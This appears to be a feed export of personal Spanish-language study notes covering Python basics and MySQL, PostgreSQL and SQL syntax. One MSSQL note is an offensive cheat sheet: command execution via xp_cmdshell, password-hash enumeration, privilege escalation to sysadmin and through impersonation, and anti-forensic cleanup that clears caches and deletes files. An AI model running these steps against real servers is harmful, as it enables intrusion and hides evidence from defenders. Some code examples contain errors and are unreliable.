<br>Estructuras de Datos Fijas: Se usan para crear estucturas de datos que no deben cambiar, como los días de la semana o las coordeanadas de un punto en el espacio. 
<br>Ejemplo:<br>my_tuple = (1, 2, 3)
my_2nd_tuple = (4, 5, 6)

# List an element
my_tuple[2]

a, b, c = my_tuple
print(a) # 1
print(b) # 2
print(c) # 3

new_tuple = my_tuple + my_2nd_tuple
print(new_tuple) # (1, 2, 3, 4, 5, 6)

new_tuple_2 = mytuple * 2
print(new_tuple_2) # (1, 2, 3, 1, 2, 3)

even_numbers = tuple(i for i in range(100) if i % 2 == 0)
Copy<br><br>Los conjuntos son una colección de elementos sin orden y sin elementos repetidos, inspirados en la teoría de conjuntos de las matemáticas. Son ideales para la gestión de colecciones de elementos únicos y operaciones que requieren eliminar duplicados o realizar comparaciones de conjuntos. Algunas de sus características son:<br>
<br>Unicidad: Los conjuntos automáticamente descartan elemntos duplicados, lo que los hace perfectos para recolectar elementos únicos.
<br>Desordenados: A diferencias de las slistas y las tuplas, los conjuntos no mantienen lso elementos en ningún orden específico.
<br>Mutabilidad: Los elementos de un conjunto puede ser agregados o eliminados, pero los elementos mismos deben ser inmutables (Por ejemplo, no se puede tener un conjunto de listas, ya que las listas se pueden modificar).
<br><br>Agunas de las operaciones básicas de conjuntos o sets que se pueden realizar en Python son:<br>
<br>Adición y Eliminación: Añadir elementos con add() y eliminar elemetnos con remove() o discard().
<br>Operaciones de Conjuntos: Realizar uniones, intersecciones, diferencias y deferencias simétricas utilizando métodos o operadores respectivos.
<br>Pruebas de Pertenencia: Comprobar rápidamente si un elemento es miembro de un conjunto. 
<br>Inmutabilidad Opcional: Usar el tipo frozenset para crear conjuntos que no se pueden modificar después de su creación.
<br><br>De cara al uso que se le puede brindar a los Sets o Conjuntos en Python, algunos de ellos son:<br>
<br>Eliminación de Duplicados: Son útiles cuando se necesita de que una colección no tenga elementos repetidos.
<br>Relaciones entre Colecciones: Facilitan la comprensión y el manejo de relaciones matemáticas entre colecciones, como subconjuntos y superconjuntos.
<br>Rendimiento de Búesqueda: Proporcionan una búsqueda de elementos más rápida que las listas o las tuplas, loq eu es útil para grandes volúmenes de datos.
<br>Ejemplos:<br>con = {1, 2, 3}

con.update({4, 5, 6}) # {1, 2, 3, 4, 5, 6}
con.remove(3)
con.discard(12342) # Try delete elements that we don't know if exist in the set

con1 = {1, 2, 3, 4}
con2 = {3, 4, 5, 6}

con_cloned = con1.intersection(con2) # {3, 4}
con_union = con1.union(con2) # {1, 2, 3, 4, 5, 6}
con_differ = con1.difference(con2) # {1, 2}

con_1st = {1, 2, 3}
con_2nd = {1, 2, 3, 4, 5, 6}

con_1st.issubset(con_2nd) # True 
# Un conjunto es subconjunto de otro si todos los elementos de dicho conjunto se encuentran en otro conjunto, en este caso 1 2 y 3 estan en el 2do conjunto, por lo que el "con_1st" es un subconjunto del "con_2nd".

big_con = set(range(10001))
# Find in a set
print(9999 in big_con) # True
Copy<br><br>Los diccionarios en Python son colecciones desordenadas de pares clave-valor. A diferencia de las secuencias, ques e indezan mediante un rango numérico, los diccionarios se indexan con claves únicas, que pueden ser cualquier tipo inmutable, como cadenas o números. Algunas de las características de los diccionarios son:<br>
<br>Desordenados: Los elementos en un diccionario no están ordenados y no se accede a ellos mediante un ínidice númerico, sino a través de claves únicas.
<br>Dinámicos: Se pueden agregar, modificar y eliminar pares clave-valor.
<br>Claves Únicas: Cada clave en un diccionario es única, lo que previene duplicaciones y sobrescrituras accidentales.
<br>Valores Accesibles: Los valores no necesitan ser únicos y pueden ser de cualquier tipo de dato.
<br><br>
<br>Agregar y Modificar: Cómo agregar nuevos pares clave-valor y modificar valores existentes.
<br>Eliminar: Cómo eliminar pares clave-valor usando del o el método pop().
<br>Método de Diccionario: Utilizar métodos como keys(), values(), e items() para acceder a las claves, valores o ambos e nforma de pares.
<br>Comprensiones de Diccionarios: Una forma elegante y consida de contruir diccionarios basados en secuencias o rangos.
<br><br>
<br>Almacenamiento de Datos Estructurados: Ideales para almacenar y roganizar datos que est´+an relacionados de manera lógica, como una base de datos en memoria.
<br>Búsqueda Eficiente: Los diccionarios son altamente optimizados para recuperar valores cuando se conoce la clave, proporcionando tiempos de búsqueda muy rápidos.
<br>Flexibilidad: Pueden ser anidados, lo que significa que los valores dentro de un dicciopnario pueden ser otros diccionarios, listas o cualquier otro tipo de dato.
<br>Ejemplo:<br>person = {"name": "Dobliuw", "age": 20}

# Access to key-values
print("\n[+] {} have {} years old".format(person["name"], person["age"]))

# Add a key-value
person["job"] = "Hacker"

# Delete keys and values
del person["job"]

# Get a lenght
print(len(person))

# Clear the dictionary
person.clear()

# Dictionary comprenhension
nums_power = {x:x**2 for x in range(11)}
five_table = {num:num * 5 for num in range(11)}

# Get all Keys and Values
person.keys()
person.values()

# Found values
person.get("name", "Not founded")

# Join dictionarys
person = {"name": "Dobliuw", "age": 20}
job = {"job_name": "Hacker", "hobbie": "Skate"}

person.update(job) #  {"name": "Dobliuw", "age": 20, "job_name": "Hacker", "hobbie": "Skate"}

# Travel de dictionary
for key, value in person.items():
	print("\[+] The key {} have the value {}.".format(key, value))
Copy<br><br>Los condicionales son estructuras de control que permiten ejecutar diferentes bloques de código dependiendo de si una o más condiciones son verdaderas o falsas (Basandose en la teoria de Bool). En python, las declaraciones condicionales más comunes son if, elif y else. <br>
<br>if: Evalúa si una condición es verdader y, de ser así, ejecuta un bloque de código.
<br>elif: Abreviatura de else if, se utiliza para verificar múltiples expresiones sólo si las anteriores no son verdaderas. 
<br>else: captura caulquier ccaso que no haya sido capturado por las decalaraciones if y elif anteriores.
<br>Ejemplo:<br>age = 20

if age &gt; 18: 
	print("\n[+] The age {} is greater than 18.".format(age))
elif age == 18: 
	print("\n[+] The age {} is equal to 18.".format(age))
else: 
	print("\n[+] The age {} is less than 18.".format(age))

# Ternarios
print("You are older" if age &gt;= 19 else "You are younger")
Copy<br><br>Los operadores lógicos condicionales se utilizan para añadir condiciones, tanto en los if como en cualquiera de las instrucciones que lleven una condición. En el caso de python existen algunas las cuales son:<br>
<br>or: Ejecutar un código si una condición de las múltiples condiciones existentes se cumple.
<br>and: Ejecutar un código si todas las condiciones de las múltiples existentes se cumplen.
<br>not: Negar una condición.
<br>Ejemplos:<br># Simple login example
name = "Dobliuw"
password = "Dobliuw123"
age = 20
token = "dcba"

if name == "Dobliuw" and password == "Dobliuw123":
	# Login success

if (name == "Dobliuw" and password == "Dobliuw123") or token = "dcba":
	# Login success

if "abcd" not in token:
	# Login success
Copy<br><br>Los bucles permiten ejecutar un bloque de código repetidamente mientras una condición sea verdadera o para cada elemento en una secuencia. Los dos tipos principales de bucles que se suelen utilizar en múltiples lenguajes de programación son for y while. <br>
<br>for: Se usa para iterar sobre una secuencia (Como puede ser una lista, un diccionario, una tupla o un conjunto) y ejecutar un bloque de código para cada elemento de la secuencia. 
<br>while: Ejecuta un blqoue de código repetidamente mientras una condición específica se mantiene verdadera.
<br><br>Existen declaraciones de control de flujo que pueden modificar el comportamiento de los bucles, como break, continue y pass.<br>
<br>break: Termina el bucle y pasa el control a la siguiente decalaración fuera del bucle.
<br>continue: Omite el resto del c´doigo dentro del bucle y continúa con la siguiente iteración.
<br>pass: No hace nada, se utiliza como una declaración de relleno donde el código eventualmente irá, pero no ha sido escrito todavía.
<br>Ejemplos:<br># For loop
arr = [1, 2, True, "Dobliuw", [65, 43]]
dic = {name: "Dobliuw", age: 20}

for pos, elem in enumerate(arr):
	print("\n[!] We'll find {} in the position {}".format(elem, pos + 1))

for key, val in dic:
	print("\n[!] Key {}: value {}".format(key, value))

# While loop
num = 0

while num &lt; 11: 
	print("\n[!] This is a custom for using while, number {}".format(num))
	num += 1

# Nested loop 
arr = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]

for i in arr:
	for l in i:
		print("\n[!] The number is: {}".format(l))

# List comprehension 
arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

power_of_2 = [num ** 2 for num in arr]
only_odd_nums_power_of_2 = [num ** 2 for num in arr if num % 2 != 0 ]

# Loop control

# Break
for i in range(11):
	if i == 11:
		break
	print(i)
else:
	print("\n[+] Loop ended successfully")
# 1 2 3 4 5 6 7 8 9 10 
# [+] Loop ended succesfylly


for i in range(11):
	if i == 5:
		break
	print(i)
else:
	print("\n[+] Loop ended successfully")
# 1 2 3 4 

# Pass
while True: 
	pass

# Continue
for i in range(11):
	if i == 5:
		continue
	print("\n i")
# 1 2 3 4 6 7 8 9 10
Copy<br><br>Las funciones son bloques de código reutilizables diseñados para realizar una tarea específica. En Python, se definen usando la palabra clave 'def' s eguida de un nombre descriptivo y personalizado para la función, paréntesis (Que pueden contener parámetros) y dos puntos. Los parámetros son "variables de entrada" que pueden cambiar cada vez que se llama a la función. Esto permite a las funciones operar con diferentes datos y producir resultados correspondientes.<br>Las funciones pueden devolver valores al programa principal o a otras funciones mediante la palabra clave 'return'. Esto  las hace increíblemente versátiles, ya que pueden procesar datos y luego pasar esos datos modificados a otras partes del programa.<br>Ejemplo:<br>def say_hi(name):
	print("\n[+] Hi {}".format(name))
Copy<br><br>La interacción del usuario a través de la consola es una habilidad esencial en Python, tanto la función input() como la función print() son claves en este aspecto<br>if __name__ == "__main__":
	age = int(input("How old are you?: "))
	print("Oh ok! I get it! You've {} years old.".format(age))
Copy<br>En caso de que quisieramos solicitar datos al usuario pero no permitirle ver lo que escribe como cuando se ingresa la contraseña del usuario tras ingresar sudo {command}:<br>from getpass import getpass

if __name__ == "__main__":
	password = getpass("Please insert your password: ")
Copy<br><br>El Scope de una variable se refiere a la región de un programa donde esa variable es accesible. En Python, hay dos tipos principales de ámbitos.<br>
<br>Local: Las variables definidas dentro de una función tiene un ámbito local, lo que significa que solo pueden ser accedidas y modificadas dentro de la función donde fueron creadas.
<br>Global: Las variables definicas duera de todas las funciones tienen un ámbito global, lo que signicia que pueden ser accedidas desde cualquier parte del programa. Sin embargo, para modificar una variable globarl dentro de una función, se debe declarar como global. 
<br>Ejemplo: <br># Local Scope
def random_function():
	local_var = "This is an example of a local var"
	print(local_var)

random_function() # This is an example of a local var
print(local_var) # Error 'local_var' is not defined

# Global Scope
global_var = "This is an example of a global var"

def random_function():
	print(global_var) 

random_function() # This is an example of a global var
print(global_var) # This is an example of a global var

# Global and Local Scope
# 1st example
var = "This is an example of a global var"

def random_function():
	var = "This is an example of a local var"
	print(var) 

random_function() # This is an example of a local var
print(var) # This is an example of a global var

# 2nd exmaple
var = "This is an example of a global var"

def random_function():
	global var 
	var = "I'm a global var too but changed in a function"

random_function() # I'm a global var too but changed in a function
print(var) # I'm a global var too but changed in a function

Copy<br><br>Las funciones lambda son también conocidas como funciones anónimas debido a qeu no se les asigna un nombre explícito al definirlas. Se utilzan para crear pequeñas funciones en el lugar donde se necesitan. generalmente para una operación específica y breve. En Python, una función lambda se define con la palabra clave 'lambda', seguida de una lista de argumentos, dos puntos y la expresión que desea evaluar y devolver.<br>Una de las ventajas de las funciones lambda es su simplicidad sintáctica, lo que las hace ideal para su uso en operaciones que requiere una función por un breve momento y para casos donde la definición de una función tradicional completa sería excesivamente verbosa.<br>Algunos de los usos comunes de las funciones anónimas son:<br>
<br>Con funciones de orden superior: Como aquilass que requieren otra función como arguemento, por ejemplo map(), filter() y sorted().
<br>Operaciones simples: Para realizar cálculos o acciones rápidas donde una función completa sería innecesariamente larga.
<br>Funcionalidad en línea: Cuando se necesita una funcionalidad simple sin la necesidad de reutilizar en otro lugar del código.
<br>Ejemplo:<br># Numbers ^ 2 
arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

print("\n[+] You've here all numbers^2: ")
print(list(map(lambda num: num ** 2, arr))) # [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]

# Only odd numbers
arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

print("\n[+] You've here only the odd numbers:")
print(list(filter(lambda num: num % 2 != 0, arr))) # [1, 3, 5, 7, 9]

# Multiply all positions in array
from functools import reduce 
arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

print("\n[+] You've here the result:")
print("{:,}".format(reduce(lambda num1, num2: num1*num2, arr)).replace(",", ".")) # 3.628.800
Copy<br><br>Los errores pueden ocurrir por muchas razones: errores de código, datos de entrada incorrectos, problemas de conectividad, entre otros. En lugar de permitir que un programa falle con un error, Python nos proporciona herramientas para "atrapar" estos errores y manejarlos de manera controlada, evitando así que el programa se detenga inesperadamente y permitiendo reaccionar de manera adecuada.<br><br>Una excepción en Python es un evento que ocurre durante la ejecución de un programa que interrumpe el flujo normal de las instrucciones del programa. Cuando el intérprete se encuentra con una situación que no puede manejar, "arroja" una excepción.<br>Ejemplo:<br># Handle execptions
# Multiple exception in multipe code blocks
try:

	num = 14/0
	string = "Dobliuw"/4
	
except ZeroDivisionError:
	print("You can not divide numbers by zero.")
except TypeError:
	print("You can not split numbers with strings.")
else:
	print("This code will run if there isn't exceptions.")
finally:
	print("This code will always run.")

# Multiple exception in one code

try:
	# .... code
except (ZeroDivisionError, TypeError):
	# .... handle exceptions

# Make exceptions
try:
	num = int(input("[+] Please insert a number: "))
	if num &lt; 0:
		raise Exception("This is a new and default exception. U can't insert negative numbers.")
except ValueError:
	print("\n[!] Please insert a number and not a string.")
Copy<br><br>La lectura y escritura de archivos son operaciones fundamentales en la mayoría de los programas, y Python proporciona herramientas sencillas y poderosas para manejar archivos.<br>#!/usr/bin/env python3

def write_file(file, content):
        f = open(file, "a")
        f.write(f"{content}\n")
        f.close()

# This methods could throw an error if we forget close the file with close().

def open_file(file):
        f = open(file, "r")
        print(f.read())
        f.close()


def open_file_v2(file): # This method load the all file in memory
        with open(file, "r") as f:
                print(f.read())


def open_file_better(file): # This method don't load the all file in memory
        with open(file, "r") as f:
                for line in f:
                        print(line.strip())

write_file("example.txt", "This is a test")
open_file_v2("/etc/hosts")

Copy<br>Tratando con archivos binarios (Copiando una imagen):<br>#!/usr/bin/env python3
 
def copy_image(in_path, out_path):
    with open(in_path, "rb") as f_in, open(out_path, "wb") as f_out:
        image = f_in.read()
        f_out.write(image)
 
copy_image("/home/kali/Wallpapers/wallpaper.jpg", "/home/kali/Desktop/testing.png")
Copy<br><br><br>Python proporciona varias maneras de formatear cadenas, permitiendo insertar varaibles en ellas, así como controlar el espaciado, alineación y precisión de los datos mostrados. Dentro de estas técnicas existen varías algunas más conocidas y usadas que otras: <br><br>Este método clásico utiliza marcadores de posición como '%s' para cadenas, '%d' para enteros o '%f' para flotantes. <br>Ejemplo:<br>num1 = 4
num2 = 4

print("\n[+] El resultado de %d + %d es %d" % (num1, num2, num1 + num2))
Copy<br><br>Este método, introducido en Python 2.6, permite una mayor flexibilidad y claridad. Utiliza llaves '{}' como marcadores de posición dentro de la cadena y puede incluir detalles sobre el formato de la salida. <br>Ejemplo:<br>name = "Dobliuw"
age = 20

print("\n[+] Hi my name is {}".format(name))
print("\n[+] Hi my name is {0} and I'm {1} years old. Att. {0}".format(name, age))
Copy<br><br>Disponible desde Python 3.6, los F-Strings ofrecen una forma concisa y legible de incrustar expresiones dentro de literales de cadena usando la letra 'f' antes de las comillas de apertura y llaves para indicar dónde se insertarán las variables o expresiones.<br>Ejemplo:<br>name = "Dobliuw"

print(f"\n[+] Hi my name is {name}")
Copy<br>]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/python.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Python.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sun, 03 Dec 2023 02:36:07 GMT</pubDate></item><item><title><![CDATA[Conexión a la base de datos:]]></title><description><![CDATA[ 
 <br>exec -xp_cmdshell '{command}';
-- Ejecutar comando 
exec sp_configure '{option}', 0/1;
-- Activar o desactivar opción
RECONFIGURE
-- Actualizar el cambio de configuración aplicado
select name from master.sys.databases
-- Listar base de daots
select table_name from {db}.information_schema.tables
-- Listar tablas de la base de datos
use {db}
-- Usar la db para poder ver columnas 
select * from {table}
-- Mostrar todo para la base de datos
Copy<br><br>
<br>Conexión básica desde la línea de comandos: sqlcmd -S &lt;IP_address&gt; -U &lt;username&gt; -P &lt;password&gt;
<br>Conexión utilizando Integrated Security (sólo en Windows): sqlcmd -S &lt;IP_address&gt; -E
<br>Conexión utilizando un archivo de configuración: sqlcmd -S &lt;IP_address&gt; -U &lt;username&gt; -P &lt;password&gt; -i &lt;file_path&gt;
<br><br>
<br>Obtener la versión de SQL Server: SELECT @@VERSION
<br>Obtener información sobre las bases de datos: SELECT name, user_access_desc, is_read_only FROM sys.databases
<br>Obtener información sobre los usuarios: SELECT name, type_desc, default_schema_name FROM sys.database_principals
<br>Obtener información sobre las tablas: SELECT name FROM sys.tables
<br>Obtener información sobre las columnas de una tabla: SELECT name, system_type_name FROM sys.columns WHERE object_id = OBJECT_ID('&lt;table_name&gt;')
<br><br>
<br>Enumeración de cuentas de usuario con contraseñas débiles: SELECT name, password_hash FROM sys.sql_logins WHERE is_disabled = 0 AND is_expiration_checked = 0 AND password_hash IS NOT NULL
<br>Obtención de credenciales de Windows (sólo en Windows): SELECT auth_scheme, net_transport, protocol_type, encrypt_option FROM sys.dm_exec_connections WHERE session_id = @@SPID
<br>Explotación de SQL Injection: SELECT * FROM &lt;table_name&gt; WHERE &lt;vulnerable_parameter&gt; = '&lt;malicious_input&gt;'
<br>Explotación de Buffer Overflow: Utilizar herramientas de explotación como Metasploit o Immunity Debugger.
<br>Explotación de SQL Server Agent Job: Utilizar herramientas como PowerUpSQL o PowerView para buscar y explotar jobs mal configurados.
<br>Explotación de SQL Server Integration Services (SSIS): Utilizar herramientas como Ysoserial.net para construir payloads maliciosos y ejecutarlos a través de SSIS.
<br><br>
<br>Elevación de privilegios utilizando xp_cmdshell: EXEC xp_cmdshell '&lt;command&gt;'
<br>Elevación de privilegios utilizando SET-UID: CREATE PROCEDURE dbo.spAddLoginAsSysadmin AS EXEC sp_addsrvrolemember 'DOMAIN\Username', 'sysadmin'
<br>Elevación de privilegios utilizando impersonation: EXECUTE AS LOGIN = '&lt;login_name&gt;'; &lt;malicious_code&gt;; REVERT;
<br><br>
<br>Eliminar la ejecución de comandos maliciosos: DELETE FROM sysjobs WHERE name = '&lt;job_name&gt;'
<br>Eliminar los registros de las consultas realizadas: DBCC FREEPROCCACHE; DBCC DROPCLEANBUFFERS;
<br>Eliminar las huellas de los archivos cargados: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; EXEC sp_OACreate 'Scripting.FileSystemObject', @object OUT; EXEC sp_OAMethod @object, 'DeleteFile', NULL, '&lt;file_path&gt;'; EXEC sp_OADestroy @object;
]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/mssql.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/SQL/MSSQL.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:19 GMT</pubDate></item><item><title><![CDATA[MySQL]]></title><description><![CDATA[ 
 <br><img alt="Pasted image 20230215165210.png" src="https://dobliuw.com/lib/media/pasted-image-20230215165210.png"><br><br>-- Creating an user after download myqsl
sudo mysql

CREATE USER 'new_user'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON * . * TO 'new_user'@'localhost';
FLUSH PRIVILEGES;

  
-- listar y ver la contrucción de una db:
select * from information_schema.columns where table_name='table_name';
 
-- Crear base de datos:
create database {name};

-- Eliminar base de datos: 
drop database {name}; 

-- Eliminar tabla:
drop table {name};

-- listar base de datos:
show databases;

-- conectarse a una base de datos:
use database | connect database

-- listar tablas de una base de datos:
show tables;

-- crear una tabla en la db:
create table users(
	userid int not null primary key auto_increment,
	username varchar (50) not null,
	password varchar (50) not null,
);

-- Add:
inser into users(username, password, email)
values ("owen", "123", "a@gmail.com"), ("masdatos", "para ingresar", "de manera multiple");

-- Foreing key 
alter table {table_name} add column {column_name} {...values}; 
alter table {table_name} add constrain {column_name} foreing key (column_name) references {table_name}({column}); 

-- Execute querys
mysql -u{username} -p{password} -e 'select * from {table}' {db_name}

-- Show tables  
mysqshow -u{username} -p{password} {db_name}
-- Show columns
mysqshow -u{username} -p{password} {db_name} {table_name}
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/mysql.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/SQL/MySQL.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 30 Dec 2023 14:50:31 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230215165210.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230215165210.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[PostgreSQL]]></title><description><![CDATA[ 
 <br><img alt="Pasted image 20230215165210.png" src="https://dobliuw.com/lib/media/pasted-image-20230215165210.png"><br><br>-- Connect
psql -U {username} -h {host} -p {port} 


-- Crear base de datos:
create database name;

-- listar base de datos:
\l

-- conectarse a una base de datos:
\c name

-- listar tablas de una base de datos:
\d

-- Enumerar privilegios
\du

-- Solicitar datos de una tabla de una base de datos:

-- crear una tabla en la db:
create table users(
	userid int primary key,
	username varchar (50) not null,
	password varchar (50) not null,
);

create table roles(
	roleid int primary key,
	rolename varchar(50) unique not null
);

-- Relaciones:
create table users_roles(
	userid int not null,
	roleid int not null,
	primary key(userid, roleid),
	foreign key (roleid)
	references roles (roleid),
	foreign key (userid)
	references users (userid)
);

-- Add:
inser into users(username, password, email)
values ("owen", "123", "a@gmail.com");
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/postgresql.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/SQL/PostgreSQL.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:19 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230215165210.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230215165210.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[SQL]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ACLARACION" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ACLARACION</a> 
 <br><img alt="Pasted image 20230215165210.png" src="https://dobliuw.com/lib/media/pasted-image-20230215165210.png"><br><br>MODELO ER (Con Notación de Chen ):  <br><br>
<br>


<br><br><br><img alt="Pasted image 20230403162341.png" src="https://dobliuw.com/lib/media/pasted-image-20230403162341.png"><br>
<br>


<br><br><br>Simples:<br>
<img alt="Pasted image 20230403162759.png" src="https://dobliuw.com/lib/media/pasted-image-20230403162759.png"><br><br>Compuestos: <br><br><img alt="Pasted image 20230403163235.png" src="https://dobliuw.com/lib/media/pasted-image-20230403163235.png"><br>Multivalor: <br><br><img alt="Pasted image 20230403163410.png" src="https://dobliuw.com/lib/media/pasted-image-20230403163410.png"><br>Derivados:<br><br><img alt="Pasted image 20230403163806.png" src="https://dobliuw.com/lib/media/pasted-image-20230403163806.png"><br>KEY:<br><br><img alt="Pasted image 20230403164237.png" src="https://dobliuw.com/lib/media/pasted-image-20230403164237.png"><br>Registros: <br><br><br><br><br>CREACIÓN de usuario con privilegios: <br>create user 'name'@'ip' identified by 'password';

grant all privileges on '{db_name}.*' to 'name'@'ip'; 
Copy<br>CREACIÓN de base de datos: <br>create database "usersdb";
Copy<br>USO de la base de  datos:<br>use "usersdb";
Copy<br>CREACIÓN de TABLA para la base de datos: <br>create table "users"(
	user_id int primary key auto_increment,
	name varchar(50) not null,
	email varchar(50) not null,
	password varchar(50) not null
);
Copy<br>INSERTAR VALORES en las tablas:<br>insert into "users"(name, email, password)
values("Name1", "email1@gmail.com", "password1"), ("Name2", "email2@gmail.com", "password2")
Copy<br>FOREING KEY: <br>CREANDO una tabla para agregar la FK:<br>create table "orders"(
	order_id int primary key auto_increment,
	profesional varchar(50) not null,
	orderDate date not null, 
	user_id int not null,
	constraint user_id foreing key (user_id)
	references usersdb(user_id)
);
Copy<br><br><br><a href="https://dobliuw.com?query=tag:ACLARACION" class="tag" target="_blank" rel="noopener nofollow">#ACLARACION</a> <br>La query "ALTER TABLE {table_name}"  sirve para ALTERar una TABLA<br><br>MODIFICANDO una tabla para agregar la FK: <br>alter table "orders"
add constrain user_id
foreing key (user_id) references usersdb(user_id);

-- Otra manera:

alter table "orders"
add foreing key (user_id) references usersdb(user_id);

Copy<br>ELIMINANDO una FK: <br>alter table "orders"
drop foreing key user_id;
Copy<br>Agregando un nuevo campo:<br>-- Con esto podemos agregar una columna con los datos deseados y especificar despues de que columna agregarlo

alter table orders 
add column 'random' varchar(50) after user_id
Copy<br><br><img alt="Pasted image 20230404130357.png" src="https://dobliuw.com/lib/media/pasted-image-20230404130357.png"><br>ELIMINAR un registro especifico: <br>delete from users where user_id=7
Copy<br>MODIFICAR un registro: <br>-- Edit: 

update users set name='NuevoNombre' where name='Ejemplo'

-- Multiple edit:

update users 
set name='NuevoNombre',
email='NuevoEmail'
where name='Ejemplo'
Copy<br><br><br>Consultar TABLAS (DB en uso): <br>show tables; 
Copy<br>Consultar las COLUMNAS de una tabla (DB en uso):<br>show columns from "users";
Copy<br>Consultar BASES DE DATOS registradas: <br>select schema_name from information_schema.schemata;
Copy<br>Consultar TABLAS de una db: <br>select table_name from information_schema.tables where table_schema='usersdb';
Copy<br>Consultar COLUMNAS de una tabla de una db: <br>select column_name from information_schema.columns where table_schema='usersdb' and table_name='users';
Copy<br>Consulta de una TABLA uniendo FK a la query:<br>select * from orders join users where users.user_id=orders.user_id;  
Copy<br>Consulta de datos con AS y operaciones:<br>select number,number*2 as numberDoble from orders;
Copy<br> Consulta DISCRIMINANDO datos: <br>select * from users where not name='Dobliuw'
-- Traer todos los registros de la tabla users menos cuando name = 'Dobliuw'
Copy<br>ORDENAR la consulta: <br>select * from orders order by number 
-- Seleccionar todo de la tabla orders ordenado por numbers de manera ascendente

select * from orders order by number DESC
-- Seleccionar todo de la tabla orders ordenado por numbers de manera descendente 

Copy<br>Consultar IGNORANDO REPETIDOS:<br>select distinct * from  users
Copy<br>Consultar LIMITANDO los resultados:<br>-- Limitando la respuesta en 5 registros
select * from users limit 5 

-- Limitando la respuesta a 5 a partir del registro 3
select * from users limit 3,5
Copy<br>Consultar con resultados RANDOM:<br>-- Esta query constantemente arrojaria dos registros aleatorios 
select * from users order by rand() limit 2 
-- (Podrian ingresarse condiciones)
Copy<br>Consultar valores ENTRE un rango: <br>select * from users where user_id between 4 and 10

-- Tambien es usado para las fechas: 

select * from {db} where dates between 'yyyy-mm-dd' and 'yyyy-mm-dd'
Copy<br>Consultar valores con "REGEX" ( LIKE ):<br>-- Que empieze con 'D'
select * from users where name like 'D%'

-- Que termine con 'w'
select * from users where name like '%w'

-- Que tenga 'obli' en el texto
select * from users where name like '%obli%'

-- Que una 'b' en la tercera posición
select * from users where name like '__b%'

-- Que terminen con 'b' 
select * from users where name like '%_u_'

-- Que empieze con 'D' y termine con 'D'
select * from users where name like 'D%w'

-- Que sea un registro de 7 caracteres y la segunda posición tenga un 'o'
select * from users where name like '_o_____'
Copy<br>Consultar valores con NULL y NOT NULL:<br>-- Seleccionar todos los que sean nulos 
select * from users where name is null order by ASC 

-- Seleccinoar todos los que no sean nulos 
select * from uesrs where name is not null order by ASC

Copy<br>Consultar valores con IN: <br>-- Seleccionar todos los registros que tengan un valor de user_id que este dentro de la tupla del in (3,4,5,6)
select * from users where user_id in (3,4,5,6)

select * from users where name in ("Dobliuw")

-- Seleccionar todos los registros que tenguna un valor de user_id que NO este dentro de la tupla del in (3,4,5,6)
select * from users where user_id not in (3,4,5,6)

Copy<br><br><br> Funciónes de AGREGACIÓN: <br>-- ### IMPORTANTE ### -- 
-- Las funciones de agregación retornan un resultado, es decir, por ejemplo, ROUND(AVG(user_id)), devuelve el redondeamiento del promedio de los user_id, ese resultado puede ser renombrado con "as", por ejemplo "ROUND(AVG(user_id)) as result" ahora, result va a   ser el resultado y es importante recordar que este ressultado...
--  ########### NO SE PUEDE USAR EN OTRA FUNCIÓN DE AGREGACIÓN. ##############

-- Devuelve la cantidad de registros que tienn user_id
select COUNT(user_id) from users

-- Devuelve la suma de todos los user_id
select SUM(user_id) from users

-- Devuelve el promedio de los user_id
select AVG(user_id) from users

-- Devuelve un nro redondeado a 3 decimales del promedio de los user_id
select ROUND(AVG(user_id),3) from users

-- Devuelve el nombre como 'Nombre' y el valor MINIMO de user_id como 'ID' siempre y cuando name no sea NULL 
select name as 'Nombre', MIN(user_id) as 'ID' from users where name is not null 

-- Devuelve el nombre como 'Nombre' y el valor MAXIMO de user_id como 'ID' siempre y cuando name no sea NULL 
select name as 'Nombre', MAX(user_id) as 'ID' from users where name is not null
Copy<br>Consultas con GROUP BY y HAVING:<br>-- El GROUP BY se utiliza para agrupar registros
select name as 'Nombre', ROUND(user_id / 2,2) as 'ID' from users group by user_id

-- El HAVING se usa como un where pero del resultado de una función
select name as 'Nombre', ROUND(user_id / 2,2) as 'ID' from users group by email having ID &gt; 2;

-- Ejemplos: 
select distinct CategoryID as 'ID', ROUND(UnitPrice/2, 3) as 'Precio' from Products 
group by ID 
having Precio &gt;= 10 
limit 0,20;
Copy<br>ESTRUCTURA de una query: <br>SELECT....FROM....
WHERE.....
GROUP BY....
HAVING....
ORDER BY....
LIMIT....
